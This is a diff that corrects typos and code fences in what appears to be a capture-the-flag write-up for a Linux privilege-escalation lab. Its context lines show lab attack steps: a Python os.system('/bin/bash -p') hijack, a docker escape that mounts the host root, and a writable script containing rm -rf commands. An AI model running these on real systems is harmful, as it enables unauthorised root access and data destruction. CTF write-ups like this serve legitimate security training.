@@ -1000,9 +1000,9 @@ puts("Give Me money Man!!!\n"Give Me money Man!!!
 mission24@linuxagency:~$ 
 ```
 
-Tho environment variables (`pocket` and `init`) are accessed.
+Two environment variables (`pocket` and `init`) are accessed.
 
-Let's set `pocket` variable to `money` and run the program again.
+Let's set the `pocket` variable to `money` and run the program again.
 
 ```bash
 mission24@linuxagency:~$ export pocket=money
@@ -1335,7 +1335,7 @@ rm -rf /dev/shm/
 #echo "Here time is a great matter of essence"
 rm -rf /tmp/
 viktor@linuxagency:~$ 
-``´
+```
 
 Since we have write access to the script we can change its contents.
 
@@ -1522,7 +1522,7 @@ os.system("/bin/bash -p")
 
 $ chmod +x shop.py
 $ 
-``´
+```
 
 Now we can execute the script again and set the `PYTHONPATH` environment variable.
 
@@ -1927,7 +1927,7 @@ ec96850005d6        mangoman            "/usr/sbin/sshd -D"   5 years ago       
 root@ec96850005d6:/root# 
 ```
 
-Confirmed! Docker is running. Let's use [GFFOBins](https://gtfobins.org/gtfobins/docker/) a final time.
+Confirmed! Docker is running. Let's use [GTFOBins](https://gtfobins.org/gtfobins/docker/) a final time.
 
 ```bash
 root@ec96850005d6:/root# /tmp/docker run -v /:/mnt --rm -it mangoman chroot /mnt /bin/sh
